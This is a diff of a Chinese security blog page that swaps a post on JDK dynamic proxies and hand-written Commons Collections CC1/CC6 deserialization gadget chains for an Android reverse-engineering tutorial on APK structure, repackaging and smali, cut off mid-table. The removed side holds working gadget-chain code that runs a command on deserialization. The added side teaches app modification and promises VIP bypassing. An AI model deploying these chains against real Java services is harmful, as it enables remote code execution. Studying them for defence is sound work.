@@ -4,9 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="JDK动态代理基础+cc1+cc6手写利用, MajorT&#39;s Blog">
-    <meta name="description" content="大鹏一日同风起，扶摇直上九万里
-什么是动态代理？动态代理是java中的一种设计模式，简单来说，我们不直接访问源对象，而是通过一个代理访问。代理模式可以在不修改被代理对象的基础上，通过扩展代理类，进行一些功能的附加与增强。代理类和被代理类应该">
+    <meta name="keywords" content="安卓逆向从0开始（1）-初识smali、双开、汉化、去广告, MajorT&#39;s Blog">
+    <meta name="description" content="失败不是终点，放弃才是。跟着吾爱正己大佬学到了第六课签名校验，渐渐有点吃力了，可能是前面的基础没打好，开始只是听一遍课程然后跟着教程来一遍，感觉知识面漏得跟筛子一样，接下来就来对前面的课程查缺补漏一下，基础学习扎实了再继续往后。
+1.模拟器">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>JDK动态代理基础+cc1+cc6手写利用 | MajorT&#39;s Blog</title>
+    <title>安卓逆向从0开始（1）-初识smali、双开、汉化、去广告 | MajorT&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -333,12 +333,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">JDK动态代理基础+cc1+cc6手写利用</h1>
+                    <h1 class="description center-align post-title">安卓逆向从0开始（1）-初识smali、双开、汉化、去广告</h1>
                 </div>
             </div>
         </div>
@@ -362,12 +362,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Java%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">Java安全</span>
-                            </a>
-                        
-                            <a href="/tags/%E4%BB%A3%E7%A0%81/">
-                                <span class="chip bg-color">代码</span>
+                            <a href="/tags/%E9%80%86%E5%90%91/">
+                                <span class="chip bg-color">逆向</span>
                             </a>
                         
                     </div>
@@ -378,8 +374,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="post-category">
-                                Java安全
+                            <a href="/categories/Android%E9%80%86%E5%90%91/" class="post-category">
+                                Android逆向
                             </a>
                         
                     </div>
@@ -391,21 +387,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2024-04-19
+                    2024-05-15
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-05-07
+                    2024-05-15
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.6k
+                    3.9k
                 </div>
                 
 
@@ -427,26 +423,279 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><em><strong>大鹏一日同风起，扶摇直上九万里</strong></em></p>
-<h1><span id="什么是动态代理">什么是动态代理？</span></h1><p>动态代理是java中的一种设计模式，简单来说，我们不直接访问源对象，而是通过一个代理访问。代理模式可以在不修改被代理对象的基础上，通过扩展代理类，进行一些功能的附加与增强。<br>代理类和被代理类应该共同实现一个接口，或者是共同继承某个类。<br>接下来看一些代码<br>首先是我们要被实现的接口IUser</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface IUser &#123;</span><br><span class="line">    public void show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>然后是实现IUser接口的类UserImpl</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class UserImpl implements IUser&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void show()&#123;</span><br><span class="line">        System.out.println(&quot;展示&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>最后是代理了UserImpl类的代理类UserProxy</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class UserProxy implements IUser&#123;</span><br><span class="line">    IUser iUser;</span><br><span class="line"></span><br><span class="line">    public UserProxy(IUser iUser)&#123;</span><br><span class="line">        this.iUser = iUser;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void show()&#123;</span><br><span class="line">        System.out.println(&quot;调用了show&quot;);</span><br><span class="line">        iUser.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>接下来写一个测试类ProxyTest<br><img src="/images/5/Image1.png" alt="img1"><br>上述流程看起来没什么问题，那是因为UserImpl类中只实现了一个方法，真实情况往往不会这么简单，需要调用的类中往往有许多方法，所以对于代理类来说，就是一件非常麻烦的事情，原始类中所有的方法，代理类中都要添加，这样我们才能在调用代理类时，调用到原始类的对应方法。<br>这样显然是非常麻烦的，我们假设，如果代理类可以获取我们要调用的方法，然后类似于反射，根据获取的方法名反射调用原始类的方法就好了。<br>而这就需要引入JDK中的一个技术——动态代理。<br>这里需要用到Proxy类的newProxyInstance,从名称可以看出来，就是新建一个调用接口<br>结合上面的静态代理，我们先来思考一下，作为一个代理类，我们需要什么呢？<br>1、需要代理的接口；<br>2、代理类中需要做的事情；<br>3、调用一个类加载的东西，我们是在测试类中实例化的Proxy类，源码当中是没有的，我们要去加载它，所以需要一个ClassLoader。<br>我们进去Proxy类中看看<br><img src="/images/5/Image2.png" alt="img2"><br>第一个参数为类加载器，classloader，固定写法；第二个参数为我们需要代理的接口，固定写法；第三个参数即为要做的事情，需要我们自己传给它，可以看到参数类型为InvocationHander，应该和反射有些关系，进去看看<br><img src="/images/5/Image3.png" alt="img3"><br>可以看到这是一个接口，其中只有一个方法invoke，所以我们需要新建类实现这个接口，把我们新建的类的对象传入newProxyInstance中，invoke方法第二个参数即我们调用的方法，这里为show()方法；第三个参数为方法的参数值。<br>我们来写实现这个接口的类UserInvocationHandler：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class UserInvocationHandler implements InvocationHandler &#123;</span><br><span class="line">    IUser iUser;</span><br><span class="line">    public UserInvocationHandler()&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public UserInvocationHandler(IUser iUser)&#123;</span><br><span class="line">        this.iUser = iUser;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">        method.invoke(iUser, args);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>上述代码中，我们在构造函数中传入实现了我们接口的原始类对象，就直接invoke反射调用了该类的方法；这里无论外部调用了什么，invoke方法都会捕获到，并调用对应的方法。<br>接下来来写我们的测试方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class ProxyTest &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        //直接调用UserImpl类</span><br><span class="line">        IUser userimpl = new UserImpl();</span><br><span class="line">        // userimpl.show();</span><br><span class="line">        //</span><br><span class="line">        // //调用UserImpl类的代理类</span><br><span class="line">        // IUser userproxy = new UserProxy(userimpl);</span><br><span class="line">        // userproxy.show();</span><br><span class="line">        InvocationHandler userinvocationhandler = new UserInvocationHandler(userimpl);</span><br><span class="line">        //代理的接口，要做的事情，类加载器</span><br><span class="line">        IUser iUser = (IUser) Proxy.newProxyInstance(userimpl.getClass().getClassLoader(), userimpl.getClass().getInterfaces(),userinvocationhandler);</span><br><span class="line">        iUser.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>userimpl.getClass().getClassLoader()和userimpl.getClass().getInterface()为固定写法，记住就好<br>第二个参数（class数组）也可以换一种写法，因为这里我们知道实现的接口是IUser，所以可以写为new Class&lt;?&gt;[]{IUser.class}，执行效果一样。<br>以上就是JDK动态代理，接下来学习CommonsCollections1的另外一条链，动态代理为其前置知识。</p>
-<h1><span id="commonscollections1另一条链lazymap">CommonsCollections1另一条链（LazyMap)</span></h1><p>在上一篇中，我们查找调用了危险函数InvokeTransformer(transform)方法的上一个方法是TransformMap(checkSetValue)，而这一条链从这里开始不同，为LazyMap(get)<br><img src="/images/5/Image4.png" alt="img4"><br>get方法代码如下，只要factory为我们可控，就可以将其传值为实现了Transformer接口的类的对象，但是我们要走到调用transform方法的地方，需要先进入一个if。<br>这里类如其名，为什么叫LazyMap，当调用类中的get方法时，它会偷个懒，判断调用它的map中是否存在key，存在的话直接返回key值，不存在才会进入if调用transform方法，这里要注意一下。<br><img src="/images/5/Image5.png" alt="img5"><br>下图的factory的调用与TransformdMap不能说是很相似，只能说是一摸一样。。。factory参数可以在构造函数中传入，而构造函数被protected修饰，被decorate函数调用，所以可通过decorate函数传参。<br><img src="/images/5/Image6.png" alt="img6"><br><img src="/images/5/Image7.png" alt="img7"><br><img src="/images/5/Image8.png" alt="img8"><br>至于key是否可控，我们就要去查找谁调用了get方法。这里还是在AnnotationInvocationHandler中，我们在这个类中找到了5个get方法调用。其中3个被memberValues调用，1个被memberTypes调用，1个被annotationType.members()调用，那我们到底用哪个呢？其中后两个是我们不可控的，我们看看memberValues（需要map对象调用，所以必须可控）<br>它可以通过构造函数传入：<br><img src="/images/5/Image9.png" alt="img9"><br>我们再来看使用memberValues并调用了get方法的方法，发现了invoke函数，这不就是动态代理？这里AnnotationInvocationHandler类就是动态代理的调用处理器类（相当于前文中的UserInvocationHandler类），无论外面调用了什么方法，都会调用invoke。<br><img src="/images/5/Image10.png" alt="img10"><br>调用处理器类已经有了，此时，只要有一个动态代理类能够使用该处理器，并调用了任意方法，就能够走到invoke。上图可以看到，我们要走到上图中的get方法调用，首先要绕过两个if，即调用的任意方法不为equals，也不能调用有参方法。<br>可以看到，这个方法就在AnnotationInvocationHandler类中的readObject方法中被调用。<br><img src="/images/5/Image11.png" alt="img11"><br><img src="/images/5/Image12.png" alt="img12"><br>入口类，调用链，危险函数都有了，代码实现如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">    //创建Transform对象的数组，数组中的值为危险函数（transform函数）所在类的对象，最终目的就是调用到这个对象的危险函数（transform函数）</span><br><span class="line">    Transformer transformers[] = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    //将数组传入ChainedTransformer，返回一个该类的对象</span><br><span class="line">    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">    Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">    Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Constructor annotationinvokationhandlerMethod = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    annotationinvokationhandlerMethod.setAccessible(true);</span><br><span class="line">    InvocationHandler invocationHandler = (InvocationHandler) annotationinvokationhandlerMethod.newInstance(Override.class, lazymap);</span><br><span class="line">    Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]&#123;Map.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">    Object o = annotationinvokationhandlerMethod.newInstance(Override.class, mapProxy);</span><br><span class="line">    serilization(o);</span><br><span class="line">    unserilization(&quot;cc3.ser&quot;);</span><br><span class="line">&#125;</span><br><span class="line">public static void serilization(Object o) throws IOException &#123;</span><br><span class="line">    ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;cc3.ser&quot;));</span><br><span class="line">    objectOutputStream.writeObject(o);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static Object unserilization(String filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">    Object o = objectInputStream.readObject();</span><br><span class="line">    return o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>好的，我们来顺着捋一遍这个逻辑：<br>在反序列化时，a.调用AnnotationInvocationHandler的readObject方法，该方法的memberValues是mapProxy（动态代理类强转的Map类的对象）；b.因为调用了动态代理，所以会调用处理器类，也就是会走到AnnotationInvocationHandler的invoke方法，该方法调用了get方法（LazyMap的get方法），后面就跟上一节（CommonsCollections1链手写利用）一样了。<br>另外，注意上面这条链和上一篇的调用链需要jdk版本小于等于8u65，8u71及之后的版本中，cc1被修复了，在AnnotationInvocationHandler类中做了调整。</p>
-<h1><span id="commonscollections6">CommonsCollections6</span></h1><p>但是有一条不受java版本限制的利用链，它就是cc6，github地址：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java</a><br><img src="/images/5/Image13.png" alt="img13"><br>这条链后半部分与cc1相同，前半部分与URLDNS链相似，这条链比较短，并且调用方式都大差不差，这里就不剖析了，贴一下代码(jdk_8u71)：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">    Transformer transformers[] = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">    Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">    Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    TiedMapEntry tm = new TiedMapEntry(lazymap, &quot;aaa&quot;);</span><br><span class="line">    HashMap hashMap = new HashMap();</span><br><span class="line">    hashMap.put(tm, &quot;123&quot;);</span><br><span class="line">    serilization(hashMap);</span><br><span class="line">    unserilization(&quot;cc3.ser&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>上述代码存在一个问题，就是在序列化的时候依旧会执行，所以可以改写为下面的形式<br>原因：我们的逻辑是反序列化的时候，readObject函数中调用hash函数，hash中调用hashCode，然后一路调用下去，这里的问题是，在序列化的时候，put函数中也会调用hash函数然后把这条链走完，所以我们需要将这条链中的某一个类调用改为无效的。<br>下面代码中将LazyMap本该调用的ChainedTransformer对象改为了ConstantTransformer对象，所以在put的时候无法走完这条链，然后我们利用反射将ChainedTransformer对象放回去，再序列化即可。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">    Transformer transformers[] = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">    Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">    Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">    TiedMapEntry tm = new TiedMapEntry(lazymap, &quot;aaa&quot;);</span><br><span class="line">    HashMap hashMap = new HashMap();</span><br><span class="line">    hashMap.put(tm, &quot;123&quot;);</span><br><span class="line">    //如果不把key移除，那么反序列化的时候会不会进入下图中的if，也就不会调用ChainedTransformer</span><br><span class="line">    lazymap.remove(&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">    Class c = LazyMap.class;</span><br><span class="line">    Field fac = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">    fac.setAccessible(true);</span><br><span class="line">    fac.set(lazymap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    serilization(hashMap);</span><br><span class="line">    unserilization(&quot;cc3.ser&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>如果上述代码中不移除key值，这里反序列化的时候key值存在，那么就不会进入if。<br><img src="/images/5/Image14.png" alt="img14"><br>（完）</p>
+                <p><em><strong>失败不是终点，放弃才是。</strong></em><br>跟着吾爱正己大佬学到了第六课签名校验，渐渐有点吃力了，可能是前面的基础没打好，开始只是听一遍课程然后跟着教程来一遍，感觉知识面漏得跟筛子一样，接下来就来对前面的课程查缺补漏一下，基础学习扎实了再继续往后。</p>
+<h1><span id="1模拟器环境搭建">1.模拟器环境搭建</span></h1><p>略</p>
+<h1><span id="2初识apk文件结构-双开-汉化-基础修改">2.初识APK文件结构、双开、汉化、基础修改</span></h1><h2><span id="21所需工具">2.1所需工具</span></h2><p>教程demo<br>MT管理器&#x2F;NP管理器（部分需要MT会员的功能可以使用NP替代）<br>雷电模拟器<br>开发者助手（查看应用布局）</p>
+<h2><span id="22apk结构介绍">2.2apk结构介绍</span></h2><p>apk全程Android Package，它相当于一个压缩文件，只要在电脑上讲apk后缀改为zip即可解压（和直接拖入jadx后的资源文件部分效果相同）<br>apk文件结构大体相同，主要存在以下几个文件：<br>assets目录：存放APK静态资源文件，比如视频，音频。图片等；<br>lib目录： armeabi-v7a基本通用所有android设备，arm64-v8a只适用于64位的Android设备，x86常见用于Android模拟器，其目录下的.so文件是c或c++编译的动态链接库文件（此处armeabi-v7a和arm64-v8a均指的安卓CPU架构）；<br>META-INF目录：保存应用的签名信息，签名信息可以验证APK文件的完整性，相当于APK的身份证（验证文件是否有被修改）；<br>res目录：res目录存放资源文件，包括图片，字符串等等，APK的界面由它的layout文件设计（存放在assets下的资源在运行打包的时候都会打入程序安装包中，而res中的资源在运行打包操作的时候，没有被使用到的文件资源不会打包到安装包中）；<br>AndroidMainfest.xml文件：APK的应用清单信息，它描述了应用的名字，版本，权限，引用的库文件等等信息；<br>classes.dex文件：classes.dex是java源码编译后生成的java字节码文件，APK运行的主要逻辑；<br>resources.arsc文件：编译后的二进制资源文件，它是一个映射表，映射着资源和id，通过R文件中的id就可以找到对应的资源。<br>认识完上面的结构，我们需要知道，想要修改APK对应的功能时，应该到哪个文件夹下去修改，比如想要修改代码逻辑，就到dex文件中修改，想要修改媒体文件，就到assets目录下修改。</p>
+<h2><span id="23双开">2.3双开</span></h2><h3><span id="231-修改包名双开">2.3.1 修改包名双开</span></h3><p>在MT管理器中提取包-&gt;功能-&gt;找到apk共存-&gt;安装-&gt;双开<br>修改的包名即下图中的包名，也就是AndroidMainfest中的包名<br><img src="/images/6/Image1.png" alt="img1"><br><img src="/images/6/Image2.png" alt="img2"><br><img src="/images/6/Image3.png" alt="img3"><br>PS：上述demo没有做签名校验，所以可以重新签名并安装</p>
+<h2><span id="24汉化">2.4汉化</span></h2><h3><span id="241搜索文字定位">2.4.1搜索文字定位</span></h3><p>可以看到这里有几处需要汉化的文字，因为在不同的文件中，或许是dex文件，xml还有arsc文件中可能都存在需要汉化的文字。<br><img src="/images/6/Image4.png" alt="img4"><br>此时我们不知道上述文字在dex文件中或是其他文件中，所有我们全局搜索，然后在搜索结果中修改并重新打包安装即可。<br><img src="/images/6/Image5.png" alt="img5"><br><img src="/images/6/Image6.png" alt="img6"><br><img src="/images/6/Image7.png" alt="img7"></p>
+<h3><span id="242看不懂的文字替换">2.4.2看不懂的文字替换</span></h3><p><img src="/images/6/Image8.png" alt="img8"><br>需要用到工具开发者助手（打开demo软件后，在上图页面打开开发者助手浮窗，点击界面资源分析即可开始分析，复制下图文字然后全局搜索即可<br><img src="/images/6/Image9.png" alt="img9"><br>此处搜索到文件在arsc文件中，点击对应文件-&gt;翻译模式-&gt;default（第一个）-&gt;找到上图语言-&gt;点就修改翻译后文字即可（MT管理器vip可使用汉化插件）<br><img src="/images/6/Image10.png" alt="img10"></p>
+<h2><span id="25-androidmainfestxml介绍">2.5 AndroidMainfest.xml介绍</span></h2><p>AndroidMainfest.xml文件是整个应用程序的信息描述文件，定义了应用程序中包含的Activity，Service，Content provide和BroadcastReceiver组件信息。每个应用程序在根目录下必须包含一个AndroidMainfest.xml文件，且文件名不能修改。它描述了package中暴露的组件，他们各自的实现类，各种能被处理的数据和启动位置。<br>下面列举文件中常见属性：<br>versionCode：版本号，主要用来更新，例如1.2<br>versionName：版本名，给用户看的，例如1.2<br>package：包名，例如com.zj.52pj<br>uses-permission android:name&#x3D;””：应用权限，例如android.permission.INTERNET代表网络权限<br>android:label&#x3D;”@string&#x2F;app_name” ：应用名称<br>android:icon&#x3D;”@mipmap&#x2F;ic_launcher”：应用图标路径<br>android:debuggable&#x3D;”true”：是否开启debug权限</p>
+<h3><span id="251修改应用图标以及名称等">2.5.1修改应用图标以及名称等</span></h3><p>讲图标上传到共享文件夹-&gt;np管理器-&gt;功能-&gt;通用编辑-&gt;修改后重新安装</p>
+<h1><span id="3初始smailvip终结者一键三连">3.初始smail，vip终结者，一键三连</span></h1><h2><span id="31工具">3.1工具</span></h2><p>除了上述工具之外，需要用到核心破解、jadx-gui</p>
+<h2><span id="32-什么是jvm-dalvik-art">3.2 什么是JVM、Dalvik、ART</span></h2><p>JVM：java虚拟机，运行java字节码程序<br>Dalvik：Google专门玮Android设计的一个虚拟机，Dalvik有专属的文件执行格式dex（Dalvik executable）<br>ART：即Android Runtime，相当于Dalvik的升级版，本质与Dalvik无异</p>
+<h2><span id="33-smali及其语法">3.3 smali及其语法</span></h2><p>smali是Dalvik的寄存器语言，smali代码是dex反编译而来的，在修改apk的时候，不能直接修改java代码，需要修改smali代码。<br>关键字：</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>.class</td>
+<td>类名</td>
+</tr>
+<tr>
+<td>.super</td>
+<td>父类名，继承上级类名名称</td>
+</tr>
+<tr>
+<td>.source</td>
+<td>源名</td>
+</tr>
+<tr>
+<td>.field</td>
+<td>变量</td>
+</tr>
+<tr>
+<td>.method</td>
+<td>方法名</td>
+</tr>
+<tr>
+<td>.register</td>
+<td>寄存器</td>
+</tr>
+<tr>
+<td>.end method</td>
+<td>方法名的结束</td>
+</tr>
+<tr>
+<td>public</td>
+<td>公有（修饰符）</td>
+</tr>
+<tr>
+<td>protected</td>
+<td>保护，只有用一家人才能用</td>
+</tr>
+<tr>
+<td>private</td>
+<td>私有，只能自己使用</td>
+</tr>
+<tr>
+<td>.parameter</td>
+<td>方法参数</td>
+</tr>
+<tr>
+<td>.prologue</td>
+<td>方法开始</td>
+</tr>
+<tr>
+<td>.line xxx</td>
+<td>位于第xxx行</td>
+</tr>
+<tr>
+<td>数据类型对应：</td>
+<td></td>
+</tr>
+<tr>
+<td>smali类型</td>
+<td>java类型</td>
+</tr>
+<tr>
+<td>—-</td>
+<td>—-</td>
+</tr>
+<tr>
+<td>V</td>
+<td>void</td>
+</tr>
+<tr>
+<td>Z</td>
+<td>boolean</td>
+</tr>
+<tr>
+<td>B</td>
+<td>byte</td>
+</tr>
+<tr>
+<td>S</td>
+<td>short</td>
+</tr>
+<tr>
+<td>C</td>
+<td>char</td>
+</tr>
+<tr>
+<td>I</td>
+<td>int</td>
+</tr>
+<tr>
+<td>J</td>
+<td>long（64位，需要两个寄存器储）</td>
+</tr>
+<tr>
+<td>F</td>
+<td>float</td>
+</tr>
+<tr>
+<td>D</td>
+<td>double（64位，需要两个寄存器存储）</td>
+</tr>
+<tr>
+<td>string</td>
+<td>String</td>
+</tr>
+<tr>
+<td>Lxxx&#x2F;xxx&#x2F;xxx</td>
+<td>object</td>
+</tr>
+<tr>
+<td>常用指令：</td>
+<td></td>
+</tr>
+<tr>
+<td>关键字</td>
+<td>注释</td>
+</tr>
+<tr>
+<td>—-</td>
+<td>—-</td>
+</tr>
+<tr>
+<td>const</td>
+<td>重写整数属性，真假属性内容，只能是数字类型（给寄存器赋值）</td>
+</tr>
+<tr>
+<td>const-string</td>
+<td>重写字符串内容</td>
+</tr>
+<tr>
+<td>const-wide</td>
+<td>重写长整数类型，多用于修改到期时间</td>
+</tr>
+<tr>
+<td>return</td>
+<td>返回指令</td>
+</tr>
+<tr>
+<td>if-eq</td>
+<td>全程equal(a&#x3D;b)，比较寄存器ab的内容，相同则跳</td>
+</tr>
+<tr>
+<td>if-ne</td>
